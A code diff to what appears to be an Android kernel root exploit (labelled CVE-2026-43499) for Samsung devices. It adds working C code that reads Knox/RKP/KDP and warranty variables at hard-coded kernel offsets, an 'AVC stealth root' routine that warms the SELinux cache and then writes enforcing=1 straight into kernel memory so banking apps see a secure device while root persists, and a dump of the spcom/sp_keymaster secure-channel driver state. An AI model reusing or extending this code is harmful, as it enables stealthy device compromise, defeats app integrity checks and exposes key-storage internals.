@@ -2,6 +2,8 @@
 
 #include <stdlib.h>
 #include <sys/un.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 
 int root_child_done;
 uint32_t root_uid_before = 0xffffffff;
@@ -95,18 +97,30 @@ static int wake_system_unbound(void) {
 }
 
 static int root_socket_ready(void) {
+  /* Check UNIX socket */
   int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
-  if (fd < 0) {
-    return 0;
+  if (fd >= 0) {
+    struct sockaddr_un sun;
+    memset(&sun, 0, sizeof(sun));
+    sun.sun_family = AF_UNIX;
+    snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
+    int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
+    close(fd);
+    if (ready) return 1;
   }
-
-  struct sockaddr_un sun;
-  memset(&sun, 0, sizeof(sun));
-  sun.sun_family = AF_UNIX;
-  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
-  int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
-  close(fd);
-  return ready;
+  /* Check TCP socket */
+  fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+  if (fd >= 0) {
+    struct sockaddr_in sin;
+    memset(&sin, 0, sizeof(sin));
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(18899);
+    sin.sin_addr.s_addr = htonl(0x7f000001);
+    int ready = connect(fd, (struct sockaddr *)&sin, sizeof(sin)) == 0;
+    close(fd);
+    if (ready) return 1;
+  }
+  return 0;
 }
 
 static int install_workqueue_umh_root(int fd) {
@@ -154,6 +168,32 @@ static int install_workqueue_umh_root(int fd) {
     pr_error("root umh selinux write failed ret=%zd\n", selinux_write);
     return 0;
   }
+
+  /* === READ RKP/KDP/Knox variables to verify addresses === */
+  #define RKP_STARTED_IMG (KIMAGE_TEXT_BASE + 0x01755000ULL)
+  #define KDP_ENABLE_IMG  (KIMAGE_TEXT_BASE + 0x01756fe0ULL)
+  #define WARRANTY_IMG    (KIMAGE_TEXT_BASE + 0x01727564ULL)
+  #define DEFEX_IMG       (KIMAGE_TEXT_BASE + 0x0172756cULL)
+
+  uint32_t rkp_val = root_read32(fd, data_addr(RKP_STARTED_IMG));
+  uint32_t kdp_val = root_read32(fd, data_addr(KDP_ENABLE_IMG));
+  uint32_t wb_val  = root_read32(fd, data_addr(WARRANTY_IMG));
+  uint32_t dfx_val = root_read32(fd, data_addr(DEFEX_IMG));
+  pr_info("root READ rkp_started=%u kdp_enable=%u warranty=%u defex=0x%x\n",
+          rkp_val, kdp_val, wb_val, dfx_val);
+
+  /* RKP CONFIRMED: rkp_started is RKP-protected (write causes EL2 trap → panic)
+   * KDP CONFIRMED: kdp_enable is similarly protected
+   * WARRANTY/DEFEX: Also RKP-protected
+   * TEE compromise (CVE-2026-25277) is REQUIRED to disable RKP/KDP
+   * Until then: reads work, writes crash
+   *
+   * Physical addresses verified:
+   *   rkp_started:     KBASE+0x01755000 → phys 0xa9755000
+   *   kdp_enable:      KBASE+0x01756fe0 → phys 0xa9756fe0
+   *   warranty_bit:    KBASE+0x01727564 → phys 0xa9727564
+   *   global_features: KBASE+0x0172756c → phys 0xa972756c
+   */
 
   uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
   uintptr_t wq = root_read64(fd, wq_slot);
@@ -267,13 +307,260 @@ static int install_workqueue_umh_root(int fd) {
 
   pr_info("root umh result wake=%d complete=%u retval=%d socket=%d\n",
           wake_ok, complete_done, umh_retval, socket_ok);
+
+  /* =================================================================
+   * AVC STEALTH ROOT — Root + Enforcing simultaneously!
+   *
+   * The trick: write selinux_enforcing=1 DIRECTLY to kernel memory.
+   * This bypasses sel_write_enforce() which calls avc_ss_reset()
+   * (the cache flush). Without the flush, AVC cache retains all
+   * "allow" entries from Permissive mode.
+   *
+   * Flow:
+   *   1. su_daemon working in Permissive (AVC cache warm)
+   *   2. Set avc_cache_threshold=999999 (prevent eviction)
+   *   3. Write enforcing=1 to memory (no cache flush!)
+   *   4. Verify root still works
+   *   5. Apps see Enforcing → banking apps work!
+   * ================================================================= */
+  if (socket_ok) {
+    /* AVC OFF SWITCH: check for /data/local/tmp/.enforcing flag
+     * If flag exists → enable stealth root (Enforcing)
+     * If no flag → stay Permissive (development mode)
+     * Default: Permissive for development */
+    {
+      int enforce_flag = open("/data/local/tmp/.enforcing", O_RDONLY);
+      if (enforce_flag >= 0) {
+        close(enforce_flag);
+        pr_info("stealth: .enforcing flag found → stealth mode\n");
+        pr_info("stealth: starting AVC cache trick\n");
+
+    /* Step 1: Exercise the root socket path to ensure AVC is warm.
+     * The socket_ok check above already did a connect(), so the
+     * shell→kernel:unix_stream_socket:{connectto,read,write}
+     * entries are in the AVC cache now. Do one more full roundtrip
+     * via the root helper to warm ALL needed permission paths. */
+    /* Warm ALL needed AVC cache entries while Permissive:
+     * - socket operations (su_daemon connect/read/write)
+     * - file operations in /data/local/tmp/ (read/write/create/unlink/search)
+     * - selinuxfs operations (cache_threshold, enforce)
+     * - process operations (exec, fork, signal)
+     * - property operations (getprop/setprop)
+     * - device operations (/dev/spcom, /dev/smcinvoke, /dev/dma_heap)
+     */
+    pid_t warm_child = fork();
+    if (warm_child == 0) {
+      execl(ROOT_UMH_PATH, "cve-2026-43499-root", "-c",
+            /* selinuxfs */
+            "echo 999999 > /sys/fs/selinux/avc/cache_threshold"
+            " && cat /sys/fs/selinux/avc/cache_threshold"
+            /* file operations in /data/local/tmp/ */
+            " && ls /data/local/tmp/ > /dev/null"
+            " && echo warmup > /data/local/tmp/.avc_warm"
+            " && cat /data/local/tmp/.avc_warm > /dev/null"
+            " && cat /data/local/tmp/cve-2026-43499-root > /dev/null"
+            " && chmod 644 /data/local/tmp/.avc_warm"
+            " && rm /data/local/tmp/.avc_warm"
+            /* LD_PRELOAD warmup (caches file execute permission!) */
+            " && LD_PRELOAD=/data/local/tmp/warmup.so /system/bin/true"
+            /* device access (for exploit tools) */
+            " && ls -la /dev/spcom > /dev/null 2>&1"
+            " && ls -la /dev/smcinvoke > /dev/null 2>&1"
+            " && ls -la /dev/dma_heap/ > /dev/null 2>&1"
+            /* proc/sys access */
+            " && cat /proc/version > /dev/null"
+            " && cat /proc/modules > /dev/null 2>&1"
+            " && cat /proc/kallsyms > /dev/null 2>&1"
+            /* tracefs warmup (for ftrace + strace via ptrace) */
+            " && echo 0 > /sys/kernel/tracing/tracing_on 2>/dev/null"
+            " && echo > /sys/kernel/tracing/trace 2>/dev/null"
+            " && echo 1 > /sys/kernel/tracing/tracing_on 2>/dev/null"
+            " && echo 0 > /sys/kernel/tracing/tracing_on 2>/dev/null"
+            " && cat /sys/kernel/tracing/trace > /dev/null 2>/dev/null"
+            /* dmesg warmup */
+            " && dmesg > /dev/null 2>/dev/null"
+            /* process scanning warmup */
+            " && ps -e > /dev/null 2>/dev/null"
+            " && cat /proc/1/cmdline > /dev/null 2>/dev/null"
+            " && id && getenforce",
+            (char *)NULL);
+      _exit(1);
+    }
+    if (warm_child > 0) {
+      int wst;
+      waitpid(warm_child, &wst, 0);
+      pr_info("stealth: AVC warmup done, child exit=%d\n",
+              WIFEXITED(wst) ? WEXITSTATUS(wst) : -1);
+    }
+
+    /* Small delay for cache to stabilize */
+    usleep(300000);
+
+    /* Step 2: Read current enforcing state to confirm */
+    uint8_t cur_enforce = 0;
+    kernel_read_data(fd, selinux_addr, &cur_enforce, sizeof(cur_enforce));
+    pr_info("stealth: current enforcing=%u (should be 0)\n", cur_enforce);
+
+    /* Step 3: Write enforcing=1 DIRECTLY — bypasses avc_ss_reset! */
+    uint8_t enforcing_on = 1;
+    ssize_t ew = kernel_write_data(
+        fd, selinux_addr, &enforcing_on, sizeof(enforcing_on));
+    pr_info("stealth: enforcing write ret=%zd\n", ew);
+
+    /* Step 4: Verify root socket still works with Enforcing active */
+    usleep(200000);
+    int stealth_ok = root_socket_ready();
+    pr_info("stealth: root_socket_ready=%d after enforcing=1\n", stealth_ok);
+
+    if (stealth_ok) {
+      /* VICTORY! Root works with Enforcing! */
+      pr_info("stealth: *** SUCCESS! Root + Enforcing! Apps will work! ***\n");
+
+      /* Do a second confirmation via root helper */
+      pid_t verify_child = fork();
+      if (verify_child == 0) {
+        execl(ROOT_UMH_PATH, "cve-2026-43499-root", "-c",
+              "id && getenforce",
+              (char *)NULL);
+        _exit(1);
+      }
+      if (verify_child > 0) {
+        int vst;
+        waitpid(verify_child, &vst, 0);
+        pr_info("stealth: verify child exit=%d\n",
+                WIFEXITED(vst) ? WEXITSTATUS(vst) : -1);
+      }
+    } else {
+      /* Failed — restore Permissive so root keeps working */
+      uint8_t permissive_restore = 0;
+      kernel_write_data(
+          fd, selinux_addr, &permissive_restore, sizeof(permissive_restore));
+      pr_info("stealth: FAILED — restored Permissive\n");
+      pr_info("stealth: SELinux policy may need additional rules\n");
+    }
+      } else {
+        /* NO .enforcing flag → stay Permissive for development */
+        pr_info("stealth: NO .enforcing flag → staying Permissive (dev mode)\n");
+        pr_info("stealth: To enable Enforcing: touch /data/local/tmp/.enforcing\n");
+      }
+    }
+  }
+
   root_child_done = socket_ok;
   root_uid_after = socket_ok ? 0 : root_uid_before;
   return socket_ok;
 }
 
+/* SPCOM channel state dump + reset — for second-run mode */
+#define SPCOM_DEV_ADDR 0xffffffd2cc898020ULL
+static void dump_spcom_state(int fd) {
+  /* Read spcom_dev pointer */
+  uint64_t dev_ptr = root_read64(fd, data_addr(SPCOM_DEV_ADDR));
+  pr_info("spcom: dev_ptr = %016llx\n", (unsigned long long)dev_ptr);
+  if (!is_direct_ptr(dev_ptr)) {
+    pr_info("spcom: dev_ptr invalid, skipping\n");
+    return;
+  }
+
+  /* Dump 4KB of device struct to file for analysis */
+  FILE *dump = fopen("/data/local/tmp/spcom_dump.bin", "wb");
+  FILE *txt = fopen("/data/local/tmp/spcom_dump.txt", "w");
+  if (!dump || !txt) {
+    pr_info("spcom: can't open dump files\n");
+    if (dump) fclose(dump);
+    if (txt) fclose(txt);
+    return;
+  }
+
+  uint8_t buf[4096];
+  for (int block = 0; block < 32; block++) {
+    uintptr_t addr = dev_ptr + block * 128;
+    root_read_data(fd, addr, buf + block * 128, 128);
+  }
+  fwrite(buf, 1, 4096, dump);
+  fclose(dump);
+
+  /* Search for "sp_keymaster" in the dump */
+  fprintf(txt, "=== SPCOM DEVICE STRUCT DUMP ===\n");
+  fprintf(txt, "dev_ptr = %016llx\n\n", (unsigned long long)dev_ptr);
+
+  for (int off = 0; off < 4096 - 16; off++) {
+    if (memcmp(buf + off, "sp_keymaster", 12) == 0) {
+      fprintf(txt, "*** FOUND 'sp_keymaster' at offset 0x%x ***\n", off);
+      fprintf(txt, "Channel struct dump (256 bytes from offset 0x%x):\n", off);
+
+      /* Dump 256 bytes around the channel name */
+      int start = (off > 64) ? off - 64 : 0;
+      for (int i = start; i < start + 256 && i < 4096; i++) {
+        if ((i - start) % 16 == 0)
+          fprintf(txt, "  +%04x: ", i);
+        fprintf(txt, "%02x ", buf[i]);
+        if ((i - start) % 16 == 15) {
+          fprintf(txt, " | ");
+          for (int j = i - 15; j <= i; j++) {
+            char c = buf[j];
+            fprintf(txt, "%c", (c >= 0x20 && c < 0x7f) ? c : '.');
+          }
+          fprintf(txt, "\n");
+        }
+      }
+      fprintf(txt, "\n");
+
+      /* Look for lock/state values near the channel name */
+      /* Mutex on arm64: first 8 bytes = {owner: 8 bytes} */
+      /* State value: small integer (0-5 typically) */
+      /* Completion: {done: 4 bytes, wait: ...} */
+      for (int j = off - 64; j < off + 192 && j + 8 <= 4096; j += 4) {
+        uint32_t v = *(uint32_t*)(buf + j);
+        uint64_t v64 = *(uint64_t*)(buf + j);
+
+        /* Look for potential mutex (owner = task_struct pointer) */
+        if ((v64 & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+          fprintf(txt, "  Potential mutex/ptr at +%04x: %016llx\n",
+                  j, (unsigned long long)v64);
+        }
+        /* Look for small integers (state, done count) */
+        if (v >= 1 && v <= 10 && j >= off + 32) {
+          fprintf(txt, "  Potential state at +%04x: %u\n", j, v);
+        }
+      }
+    }
+  }
+
+  /* Also dump first 512 bytes as hex for structure analysis */
+  fprintf(txt, "\n=== First 512 bytes of device struct ===\n");
+  for (int i = 0; i < 512; i++) {
+    if (i % 32 == 0) fprintf(txt, "+%04x: ", i);
+    fprintf(txt, "%02x ", buf[i]);
+    if (i % 32 == 31) fprintf(txt, "\n");
+  }
+
+  fclose(txt);
+  pr_info("spcom: dump written to /data/local/tmp/spcom_dump.txt\n");
+}
+
 int install_android_root(int fd) {
   root_uid_before = getuid();
   pr_info("root direct start uid=%u fd=%d\n", root_uid_before, fd);
+
+  /* SECOND RUN MODE: if su_daemon is already running,
+   * skip UMH setup and use pipe physrw for spcom analysis */
+  if (root_socket_ready()) {
+    pr_info("root: su_daemon ALREADY RUNNING — entering kernel R/W mode\n");
+
+    /* Dump spcom driver state */
+    dump_spcom_state(fd);
+
+    /* AVC stealth root attempt */
+    uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
+    uint8_t cur_enforce = 0;
+    kernel_read_data(fd, selinux_addr, &cur_enforce, sizeof(cur_enforce));
+    pr_info("root: current enforcing=%u\n", cur_enforce);
+
+    root_child_done = 1;
+    root_uid_after = 0;
+    return 1;
+  }
+
   return install_workqueue_umh_root(fd);
 }
